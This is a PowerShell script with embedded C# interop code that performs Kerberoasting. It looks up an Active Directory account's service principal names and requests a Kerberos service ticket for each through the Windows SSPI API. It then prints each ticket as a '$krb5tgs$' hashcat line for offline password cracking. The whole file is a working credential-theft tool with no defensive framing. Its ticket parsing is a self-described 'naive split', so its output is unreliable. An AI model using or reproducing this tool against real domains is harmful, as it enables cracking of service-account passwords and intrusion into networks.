Add-Type @"
using System;
using System.Runtime.InteropServices;

public class K {
    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int AcquireCredentialsHandle(
        string pszPrincipal,
        string pszPackage,
        uint fCredentialUse,
        IntPtr pvLogonID,
        IntPtr pAuthData,
        IntPtr pGetKeyFn,
        IntPtr pvGetKeyArgument,
        out IntPtr phCredential,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int InitializeSecurityContext(
        ref IntPtr phCredential,
        IntPtr phContext,
        string pszTargetName,
        uint fContextReq,
        uint Reserved1,
        uint TargetDataRep,
        IntPtr pInput,
        uint Reserved2,
        out IntPtr phNewContext,
        ref SecBufferDesc pOutput,
        out uint pfContextAttr,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int FreeCredentialsHandle(IntPtr phCredential);

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer {
        public uint cbBuffer;
        public uint BufferType;
        public IntPtr pvBuffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc {
        public uint ulVersion;
        public uint cBuffers;
        public IntPtr pBuffers;
    }

    public static byte[] GetTicket(string spn) {
        IntPtr cred = IntPtr.Zero;
        IntPtr ctx = IntPtr.Zero;
        IntPtr expiry1 = IntPtr.Zero;
        IntPtr expiry2 = IntPtr.Zero;
        uint attr = 0;

        try {
            SecBuffer secBuf = new SecBuffer();
            secBuf.BufferType = 2; // SECBUFFER_TOKEN
            secBuf.cbBuffer = 12288; // 12KB
            secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);

            IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
            Marshal.StructureToPtr(secBuf, pSecBuf, false);

            SecBufferDesc desc = new SecBufferDesc();
            desc.ulVersion = 0;
            desc.cBuffers = 1;
            desc.pBuffers = pSecBuf;

            if (AcquireCredentialsHandle(
                    null,
                    "Kerberos",
                    0x00000002, // SECPKG_CRED_OUTBOUND
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out cred,
                    out expiry1) != 0)
                return null;

            if (InitializeSecurityContext(
                    ref cred,
                    IntPtr.Zero,
                    spn,
                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
                    0,
                    16,
                    IntPtr.Zero,
                    0,
                    out ctx,
                    ref desc,
                    out attr,
                    out expiry2) != 0)
                return null;

            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
            if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
                return null;

            byte[] data = new byte[resultBuf.cbBuffer];
            System.Runtime.InteropServices.Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
            return data;
        } finally {
            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
        }
    }
}
"@

function Get-KerberosTicketHashcatFormat {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SamAccountName,

        # You provide the etype manually: 23 (RC4), 17 (AES128), 18 (AES256), etc.
        [Parameter(Mandatory)]
        [string]$Etype
    )

    $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
    if (-not $user) {
        Write-Error "User '${SamAccountName}' not found."
        return
    }

    foreach ($spn in $user.servicePrincipalName) {
        Write-Host "`n[+] Requesting TGS for SPN: ${spn}"

        try {
            $ticketBytes = [K]::GetTicket($spn)
            if (-not $ticketBytes) {
                Write-Warning "Failed to get ticket for ${spn}"
                continue
            }

            # Raw ticket as hex
            $ticketHex = [BitConverter]::ToString($ticketBytes).Replace("-", "")

            # Naive split: first 16 bytes as "checksum", rest as "cipher"
            # (Good enough for many RC4 cases; for AES, a proper ASN.1 parse is ideal.)
            $checksumHex = $ticketHex.Substring(0, 32)
            $cipherHex   = $ticketHex.Substring(32)

            $realm        = $env:USERDNSDOMAIN
            $spnSanitized = $spn.Replace(":", "~")

            # Build the hashcat line by concatenation so variables expand, while literal '$' separators remain.
            $prefix  = "`$krb5tgs$"         # literally: $krb5tgs$
            $hashcat = $prefix + $Etype + "*" + $SamAccountName + "`$" + $realm + "`$" + $spnSanitized + "*" + $checksumHex + "`$" + $cipherHex

            Write-Host "`n[+] Hashcat Format:`n${hashcat}`n"
        }
        catch {
            Write-Warning "Error while processing SPN ${spn}: $_"
        }
    }
}
